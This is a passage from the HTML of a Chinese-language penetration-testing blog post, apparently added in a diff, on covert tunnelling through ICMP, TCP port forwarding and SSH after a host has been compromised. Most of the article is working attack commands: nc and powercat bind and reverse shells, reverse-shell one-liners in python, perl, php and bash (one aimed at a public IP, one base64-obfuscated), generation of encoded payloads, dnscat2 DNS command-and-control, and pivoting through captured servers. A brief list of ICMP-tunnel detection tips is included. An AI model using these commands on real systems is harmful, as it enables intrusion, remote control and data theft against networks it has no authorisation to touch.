@@ -1,0 +1,409 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>各种通信隧道 | V3teran's blog</title><meta name="keywords" content="代理,反弹Shell,端口"><meta name="author" content="V3teran"><meta name="copyright" content="V3teran"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言网络层：IPV6、ICMP、GRE 传输层：TCP、UDP、常规端口转发 应用层：SSH、HTTP、HTTPS、DNS IPV6隧道原理：将IPV6报文封装在IPV4报文中，通过IPV4隧道传输。 现阶段边界设备、防火墙等还无法识别IPV6通信数据，攻击者会通过恶意软件来配置允许进行IPV6通信的设备，避开防火墙和IDS。 支持IPV6的隧道工具：socat、6tunnnel、nt6tunne">
+<meta property="og:type" content="article">
+<meta property="og:title" content="各种通信隧道">
+<meta property="og:url" content="https://v3teran.github.io/2021/02/09/%E5%90%84%E7%A7%8D%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93/index.html">
+<meta property="og:site_name" content="V3teran&#39;s blog">
+<meta property="og:description" content="前言网络层：IPV6、ICMP、GRE 传输层：TCP、UDP、常规端口转发 应用层：SSH、HTTP、HTTPS、DNS IPV6隧道原理：将IPV6报文封装在IPV4报文中，通过IPV4隧道传输。 现阶段边界设备、防火墙等还无法识别IPV6通信数据，攻击者会通过恶意软件来配置允许进行IPV6通信的设备，避开防火墙和IDS。 支持IPV6的隧道工具：socat、6tunnnel、nt6tunne">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194231.jpeg">
+<meta property="article:published_time" content="2021-02-09T14:00:00.000Z">
+<meta property="article:modified_time" content="2021-07-25T12:20:29.000Z">
+<meta property="article:author" content="V3teran">
+<meta property="article:tag" content="代理">
+<meta property="article:tag" content="反弹Shell">
+<meta property="article:tag" content="端口">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194231.jpeg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204173816.png"><link rel="canonical" href="https://v3teran.github.io/2021/02/09/%E5%90%84%E7%A7%8D%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '各种通信隧道',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-25 20:20:29'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/lalala.css"><link rel="stylesheet" href="https://at.alicdn.com/t/font_2364346_8smao36j8yr.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204173845.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194231.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">V3teran's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">各种通信隧道</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-09T14:00:00.000Z" title="发表于 2021-02-09 22:00:00">2021-02-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-25T12:20:29.000Z" title="更新于 2021-07-25 20:20:29">2021-07-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>18分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="各种通信隧道"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>网络层：IPV6、ICMP、GRE</p>
+<p>传输层：TCP、UDP、常规端口转发</p>
+<p>应用层：SSH、HTTP、HTTPS、DNS</p>
+<h1 id="IPV6隧道"><a href="#IPV6隧道" class="headerlink" title="IPV6隧道"></a><strong>IPV6隧道</strong></h1><p>原理：将IPV6报文封装在IPV4报文中，通过IPV4隧道传输。</p>
+<p>现阶段边界设备、防火墙等还无法识别IPV6通信数据，攻击者会通过恶意软件来配置允许进行IPV6通信的设备，避开防火墙和IDS。</p>
+<p>支持IPV6的隧道工具：socat、6tunnnel、nt6tunnel</p>
+<h1 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a><strong>ICMP隧道</strong></h1><p>若使用各类上层隧道如HTTP等操作都失败了，可以建立ICMP隧道，将TCP&#x2F;UDP数据封装到ICMP的Ping数据包中，穿过防火墙。大多数管理员会阻止ICMP通信进入系统，但允许其从系统出去，大多数网络和边界设备不会过滤ICMP流量。</p>
+<p>常用ICMP隧道工具：icmpsh、PingTunnel、icmptunnel、powershell icmp</p>
+<h2 id="PingTunnel-端口转发"><a href="#PingTunnel-端口转发" class="headerlink" title="PingTunnel-端口转发"></a><strong>PingTunnel-端口转发</strong></h2><p>相当于创建一个代理，前提是存在wincap（libpcap）类库，跨平台。</p>
+<p>linux版本环境部署（win版暂未尝试）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y byacc </span><br><span class="line">apt-get install flex </span><br><span class="line">tar zxvf libpcap-1.9.1.tar.gz </span><br><span class="line">./configure </span><br><span class="line">make &amp;&amp; make install </span><br><span class="line">tar xf PingTunnel-0.72.tar.gz </span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+
+<p>常用参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">代理：ptunnel -x 密码 -u -c 网络设备 -v 详细程度 -f 日志文件 </span><br><span class="line">客户端：ptunnel -x 密码 -p 代理地址 -lp 监听端口 -da 目标地址 -dp 目标端口 -c 网络设备 -v 详细程度 -f 日志文件 -u</span><br></pre></td></tr></table></figure>
+
+<p>思路：机器A无法直接访问目标核心数据库系统，只能通过ping命令访问，建立ICMP隧道，最后本地访问VPS的1080端口，相当于访问目标的3389端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">已拿下的机器A：ptunnel -x wawawa         开启隧道，充当于代理 </span><br><span class="line">VPS：ptunnel -p A的公网IP -lp 1080 -da 目标系统IP -dp 3389 -x wawawa</span><br></pre></td></tr></table></figure>
+
+<p>防御</p>
+<ol>
+<li>检测同一来源的ICMP数据包数量，一个正常ping命令每秒最多发两个数据包。</li>
+<li>注意payload大于64bit的ICMP包。</li>
+<li>寻找响应包中Payload与请求包中Payload不一致的ICMP包。</li>
+<li>检查ICMP包协议标签。</li>
+</ol>
+<h1 id="传输层隧道"><a href="#传输层隧道" class="headerlink" title="传输层隧道"></a><strong>传输层隧道</strong></h1><h2 id="lcx-端口转发"><a href="#lcx-端口转发" class="headerlink" title="lcx-端口转发"></a><strong>lcx-端口转发</strong></h2><p>基于socket套接字实现的端口转发工具。实现的是一对一的端口转发，若想要转发内网中多台服务器需要一次次重复转发过程，效率低。对于以下3种情况，lcx只可以突破1和2二种，因为lcx在使用中需要访问外部网络。</p>
+<ul>
+<li>服务器处于内网，可以访问外部网络。</li>
+<li>服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</li>
+<li>服务器处于内网，对外只开放了80端口，并且服务器不能访问外部网络。</li>
+</ul>
+<p><strong>win版本</strong></p>
+<p>将目标的3389端口的所有数据都转发到公网VPS的2222端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -slave 外网IP 2222 127.0.0.1 3389 端口转发</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209211833.png"></p>
+<p>将本机2222端口监听到的所有数据转发到本机的3333端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -listen 2222 3333</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209211856.png"></p>
+<p>将目标主机338端口映射到防火墙允许的其他端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -tran 6666 目标主机IP 3389 本地端口映射</span><br></pre></td></tr></table></figure>
+
+<p><strong>linux版</strong></p>
+<p>自测xshell访问远程终端不知道怎么回事会失败，putty可以。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 2 -p1 2222 -p2 3333 ./portmap -m 3 -h1 外网IP -p1 2222 -h2 127.0.0.1 -p2 22</span><br></pre></td></tr></table></figure>
+
+<h2 id="nc-反弹shell-端口转发"><a href="#nc-反弹shell-端口转发" class="headerlink" title="nc-反弹shell-端口转发"></a><strong>nc-反弹shell-端口转发</strong></h2><p>网络调试和探测工具，使用TCP或UDP协议的网络连接去读写数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v -n -z 172.16.1.12 1-10000      端口扫描</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209213750.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv -z 172.16.1.12 21      Banner抓取</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209213803.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666 -e C:\\Windows\\system32\\cmd.exe    反弹shell：正向连接 </span><br><span class="line">nc -lvvp 6666 -e /bin/sh </span><br><span class="line">nc 172.16.1.7 6666</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209220120.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666     反弹shell：反向连接 </span><br><span class="line">nc 172.16.1.1 6666 -e C:\\Windows\\system32\\cmd.exe </span><br><span class="line">nc 172.16.1.1 6666 -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209220220.png"></p>
+<p>下载文件类似，可以用-d后台传输。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666 &gt; test.txt               文件传输：上传或下载 </span><br><span class="line">nc 172.16.1.7 6666 &lt; E:\123.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209220258.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666 简易聊天 </span><br><span class="line">nc 172.16.1.1 6666</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209220346.png"></p>
+<p>思路：攻击端无法直接访问目标核心数据库系统，已拿下一台Web服务器，且该服务器可访问数据库服务器，可将Web服务器作为代理。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666                                             VPS 端口转发充当代理 </span><br><span class="line">nc -lvvp 5555 -e /bin/sh                                  数据库服务器 </span><br><span class="line">nc -v 172.16.1.1 6666 -c &quot;nc -vv 172.16.1.7 5555&quot;       Web</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209220459.png"></p>
+<p>使用编程语言等代替nc反弹。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.1.9&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; </span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;1.2.3.4&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; </span><br><span class="line">php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; </span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/172.16.1.1/6666 0&gt;&amp;1 </span><br><span class="line">bash -i &amp;gt;&amp;amp; /dev/tcp/65.49.222.180/6666 0&amp;gt;&amp;amp;1 </span><br><span class="line">bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE5MS4xMDQuMjM2LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="PowerCat-反弹shell-端口转发"><a href="#PowerCat-反弹shell-端口转发" class="headerlink" title="PowerCat-反弹shell-端口转发"></a><strong>PowerCat-反弹shell-端口转发</strong></h2><p>Powershell版nc，命令大同小异。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted </span><br><span class="line">import-module .\powercat.ps1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666              与nc互连 </span><br><span class="line">powercat -c 172.16.1.7 -p 6666 -e C:\Windows\System32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221117.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 6666                   返回Powershell </span><br><span class="line">powercat -c 172.16.1.1 -p 6666 -v -ep</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221149.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -of test.txt -v                    传输文件 </span><br><span class="line">powercat -c 172.16.1.10 -p 6666 -i C:\123.txt -v or &quot;testtest&quot; | powercat -c 172.16.1.10 -p 6666 -v</span><br></pre></td></tr></table></figure>
+
+<p>传输完毕不会自动断开，可在命令行中继续追加写入的字符，按ctrl+c断开。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221257.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221307.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -ep -v -g &gt;&gt; shell.ps1          生成Payload：正向 </span><br><span class="line">powercat -c IP -p 6666 -ep -v -g &gt;&gt; shell.ps1              反向</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221418.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 172.16.1.10 -p 6666 -ep -v -ge           -ge：生成经过编码的Payload（PS4.0及以上） </span><br><span class="line">powershell -E XXXXXXXXXXX </span><br><span class="line">powercat -l -p 6666 -v</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221527.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -v -ep                             win2012  端口转发充当代理 </span><br><span class="line">powercat -l -p 9999 -v -r tcp:172.16.1.6:6666          win7-跳板机 </span><br><span class="line">powercat -c 172.16.1.10 -p 9999 -v                     win10</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221614.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git     服务端用dnscat，powercat支持DNS协议 </span><br><span class="line">cd dnscat2/server/ </span><br><span class="line">gem install bundler bundler install ruby dnscat2.rb ttpowercat.test -e open --no-cache    服务端启用dnscat powercat -c 172.16.1.7 -p 53 -dns ttpowercat.test -e C:\Windows\System32\cmd.exe </span><br><span class="line">session -i 1    服务端执行 </span><br><span class="line">powercat -l -p 9999 -v -r dns:172.16.1.6:ttpowercat.test （充当跳板机命令）</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221851.png"></p>
+<h1 id="应用层隧道"><a href="#应用层隧道" class="headerlink" title="应用层隧道"></a><strong>应用层隧道</strong></h1><h2 id="ssh协议-端口转发-代理"><a href="#ssh协议-端口转发-代理" class="headerlink" title="ssh协议 - 端口转发-代理"></a><strong>ssh协议 - 端口转发-代理</strong></h2><p>模拟环境：远程攻击端只可以访问web服务器172.16.1.5（双IP），以web服务器为跳板，将目标172.16.1.10的3389端口映射到远程攻击端的1153端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 1153:172.16.1.10:3389 root@172.16.1.5     攻击端执行，本地转发</span><br><span class="line">接下来需要输入跳板机172.16.1.5的密码 </span><br><span class="line">netstat -tulnp | grep &quot;1153&quot;         查看端口开启成功没 </span><br><span class="line">rdesktop 127.0.0.1:1153</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209222309.png"></p>
+<p>模拟环境：远程攻击端不可以访问内网所有目标，而内网中只有Web服务器172.16.1.5（单IP）可以访问远程攻击端，以172.16.1.5为跳板，将远程攻击端的3307端口的流量转发到目标172.16.1.10的3389端口。</p>
